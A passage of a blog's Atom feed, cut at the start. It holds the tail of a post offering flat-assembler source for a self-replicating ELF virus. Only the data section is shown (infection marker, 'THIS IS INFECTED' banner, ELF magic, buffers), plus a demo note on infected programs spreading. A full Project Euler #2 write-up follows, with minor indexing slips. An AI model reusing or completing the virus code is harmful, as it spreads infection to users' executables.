+<span class="nf">vsign</span> <span class="nv">db</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x7e</span>
+<span class="nf">vsignl</span> <span class="err">=</span> <span class="kc">$</span><span class="o">-</span><span class="nv">vsign</span>
+<span class="nf">msg</span> <span class="nv">db</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x00</span>
+<span class="nf">msgl</span> <span class="err">=</span> <span class="kc">$</span><span class="o">-</span><span class="nv">msg</span>
+<span class="nf">elfmagic</span> <span class="nv">db</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x00</span>
+<span class="nf">self_size</span> <span class="err">=</span> <span class="mi">1292</span>
+<span class="nf">max_size</span> <span class="err">=</span> <span class="mi">4000000</span>
+
+<span class="nf">struc</span> <span class="nb">DI</span><span class="nv">RENT</span> <span class="err">{</span>
+    <span class="nf">.d_ino</span>          <span class="nv">rq</span> <span class="mi">1</span>
+    <span class="nf">.d_off</span>          <span class="nv">rq</span> <span class="mi">1</span>
+    <span class="nf">.d_reclen</span>       <span class="nv">rw</span> <span class="mi">1</span>
+    <span class="nf">.d_type</span>         <span class="nv">rb</span> <span class="mi">1</span>
+    <span class="nf">label</span> <span class="nv">.d_name</span>   <span class="kt">byte</span>
+<span class="err">}</span>
+<span class="nf">virtual</span> <span class="nv">at</span> <span class="mi">0</span>
+  <span class="nf">DIRENT</span> <span class="nb">DI</span><span class="nv">RENT</span>
+  <span class="nf">sizeof.DIRENT</span> <span class="err">=</span> <span class="kc">$</span> <span class="o">-</span> <span class="nb">DI</span><span class="nv">RENT</span>
+<span class="nf">end</span> <span class="nv">virtual</span>
+
+<span class="nf">infected</span> <span class="nv">rb</span> <span class="nv">max_size</span>
+<span class="nf">host</span> <span class="nv">rb</span> <span class="nv">max_size</span>
+<span class="nf">self</span> <span class="nv">rb</span> <span class="nv">self_size</span>
+</code></pre></div></div>
+
+<p><strong>DEMO</strong>   <br />
+Here is the demo showing programs being infected by the virus and then these infected programs spreading 
+its infection to other clean programs</p>
+
+<script async="" id="asciicast-529026" src="https://asciinema.org/a/529026.js"></script>
+
+<p><em><strong>NOTE:</strong> Although i mentioned that the virus is harmless but during testing i found out that it has bug that 
+it disables commandline arguments of infected files, which is obviously never will be fixed, thanks to my laziness!</em></p>]]></content><author><name>Furqan</name></author><category term="assembly" /><category term="viruses" /><summary type="html"><![CDATA[Recently, I was playing around with flat assembler and i needed something to write in it. I tried “Hello world” program but it was not enough. I believe that generally “Hello world” programs are not a good way to learn about details of a programming language, especially for somewhat experienced programmers.]]></summary></entry><entry><title type="html">Finding sum of even Fibonacci numbers</title><link href="http://localhost:4000/2022/09/20/even-fibonacci-numbers.html" rel="alternate" type="text/html" title="Finding sum of even Fibonacci numbers" /><published>2022-09-20T20:34:25+02:00</published><updated>2022-09-20T20:34:25+02:00</updated><id>http://localhost:4000/2022/09/20/even-fibonacci-numbers</id><content type="html" xml:base="http://localhost:4000/2022/09/20/even-fibonacci-numbers.html"><![CDATA[<p>It’s the problem from <a href="https://projecteuler.net/problem=2">Project Euler #2</a>, which I have <a href="https://github.com/furqantariq/Project-Euler/tree/master/p2">solved</a> couple of years ago but never properly documented it. 
+The problem states</p>
+<blockquote>
+  <p>Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be:      <br />
+     <strong>1, 2, 3, 5, 8, 13, 21, 34, 55, 89, …</strong>  <br />
+By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.</p>
+</blockquote>
+
+<p>To solve this problem, the pattern of the even numbers in fibonacci sequence need to be understood first. Since the first two numbers of fibonacci sequeunce are odd and even number, so the both third and fourth numbers will be odd numbers because summation of an even and odd number will always be an odd number. After that, these two odd numbers will be resulted in an even number and sequene will go on. In other words, it can be said that each even number will always be surrounded by two consecutive odd numbers and positioned at $ 2k+3 $ for any $k$ in a sequence as shown below:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">E</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">E</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">E</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">O</th>
+      <th style="text-align: center">E</th>
+      <th style="text-align: center">..</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">1</td>
+      <td style="text-align: center">1</td>
+      <td style="text-align: center">2</td>
+      <td style="text-align: center">3</td>
+      <td style="text-align: center">5</td>
+      <td style="text-align: center">8</td>
+      <td style="text-align: center">13</td>
+      <td style="text-align: center">21</td>
+      <td style="text-align: center">34</td>
+      <td style="text-align: center">55</td>
+      <td style="text-align: center">89</td>
+      <td style="text-align: center">144</td>
+      <td style="text-align: center">..</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br />
+Mathematically it can be written in the form of <a href="https://en.wikipedia.org/wiki/Recurrence_relation">recursive relation</a> $f$ where $ n $ is the $nth$ fibonacci number.</p>
+
+\[\begin{align} 
+f_{(odd)}(1) &amp;= 1 \\[2ex]
+f_{(even)}(2) &amp;= 2 \\[2ex]
+\end{align}\]
+
+\[\begin{align} 
+f_{(even)}(n) &amp;= f_{(odd)}(n-1) + f_{(odd)}(n-2) \\[2ex]
+f_{(odd)}(n) &amp;= f_{(even)}(n-1) + f_{(odd)}(n-2) \text{ or } f_{(odd)}(n-1) + f_{(even)}(n-2) \\[2ex]
+\end{align}\]
+
+<p>And then the next even number will be</p>
+
+\[f_{(even)}(n+1) = f_{(odd)}(n) + f_{(odd)}(n-1)\]
+
+<p>The above equation can also be desribed in terms of its relation with its predecessor even fibonacci number, that will save us some iterations in calculating sum. We can do this by expanding the $ f_{(odd)}(n-1) $.</p>
+
+\[\begin{align}
+f_{(even)}(n+1) &amp;= f_{(odd)}(n) + ( f_{(odd)}(n) - f_{(even)}(n-2)) \\[2ex]               
+f_{(even)}(n+1) &amp;= 2 \times f_{(odd)}(n) - f_{(even)}(n-2) \\[2ex]
+\end{align}\]
+
+<p>From the above equation we have everything what we need to calculate sum except $ f_{(odd)}(n) $. Instead what we have is $ f_{(odd)}(n-3) $, that can be used to calculate $ f_{(odd)}(n) $ as shown below.</p>
+
+\[\begin{align} 
+f_{(odd)}(n) &amp;= f_{(odd)}(n-1) + f_{(even)}(n-2) \\[2ex]
+f_{(odd)}(n) &amp;= (f_{(even)}(n-2) + f_{(odd)}(n-3) ) + f_{(even)}(n-2) \\[2ex]       
+f_{(odd)}(n) &amp;= 2 \times f_{(even)}(n-2) + f_{(odd)}(n-3) \\[2ex]
+\end{align}\]
+
+<p>And now finally the summation will look like this</p>
+
+\[\sum_{n=2k+3}^{f(n+1)\le 4000000} f(n+1) = \sum_{n=2k+3}^{f(n+1)\le 4000000} 2 \times f(n) - f(n-3)\]
+
+<p>Here $n=2k+3$ means that $(n+1)th$ number will point to the position of even number in fibonacci sequeunce. <em>e.g.</em> 2, 5, 8, 10 ..</p>
+
+<p>Lets calculate the first three even fibonacci numbers to test our equations</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">$k$</th>
+      <th style="text-align: center">$n$</th>
+      <th style="text-align: center">$f(n)$ odd number</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">-</td>
+      <td style="text-align: center">-</td>
+      <td style="text-align: center">$f(1) = 1 $ <em>(base)</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">1</td>
+      <td style="text-align: center">4</td>
+      <td style="text-align: center">$f(4)=2 \times f(2) + f(1) = (2 \times 2) + 1 = 5 $</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">2</td>
+      <td style="text-align: center">7</td>
+      <td style="text-align: center">$f(7)=2 \times f(5) + f(4) = (2 \times 8) + 5 = 21 $</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">3</td>
+      <td style="text-align: center">9</td>
+      <td style="text-align: center">$f(9)=2 \times f(8) + f(7) = (2 \times 34) + 21 = 89 $</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">$k$</th>
+      <th style="text-align: center">$n$</th>
+      <th style="text-align: center">$f(n+1)$ even number</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">-</td>
+      <td style="text-align: center">-</td>
+      <td style="text-align: center">$ f(2) = 2 $ <em>(base)</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">1</td>
+      <td style="text-align: center">4</td>
+      <td style="text-align: center">$ f(5)=2 \times f(4) - f(2) = (2 \times 5) - 2 = 8 $</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">2</td>
+      <td style="text-align: center">7</td>
+      <td style="text-align: center">$ f(8)=2 \times f(7) - f(5) = (2 \times 21) - 8 = 34 $</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">3</td>
+      <td style="text-align: center">9</td>
+      <td style="text-align: center">$ f(10)=2 \times f(9) - f(8) = (2 \times 89) - 34 = 144 $</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br />
+Here is the complete solution in Python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># recurrence base condition
+</span><span class="n">odd</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">even</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="c1"># initialize sum to zero
+</span><span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="c1"># loop until even number is less than or equal to 4 million 
+</span><span class="k">while</span> <span class="n">even</span> <span class="o">&lt;=</span> <span class="mi">4000000</span><span class="p">:</span>
+    <span class="c1"># add even number to sum
+</span>    <span class="nb">sum</span> <span class="o">+=</span> <span class="n">even</span>
+    <span class="c1"># calculate next odd number and even number and
+</span>    <span class="c1"># reassign those values to existing variables
+</span>    <span class="n">odd</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">even</span> <span class="o">+</span> <span class="n">odd</span>
+    <span class="n">even</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">odd</span> <span class="o">-</span> <span class="n">even</span>   
+        
+<span class="c1"># print sum to the screen
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sum=</span><span class="sh">"</span><span class="p">,</span> <span class="nb">sum</span><span class="p">)</span>
+</code></pre></div></div>
+<p>And the result is:</p>
+
+\[\sum_{n=2k+3}^{f(n+1)\le 4000000} f(n+1) = 4613732\]]]></content><author><name>Furqan</name></author><category term="mathematics" /><category term="puzzles" /><summary type="html"><![CDATA[It’s the problem from Project Euler #2, which I have solved couple of years ago but never properly documented it. The problem states Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be:      1, 2, 3, 5, 8, 13, 21, 34, 55, 89, … By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.]]></summary></entry></feed>
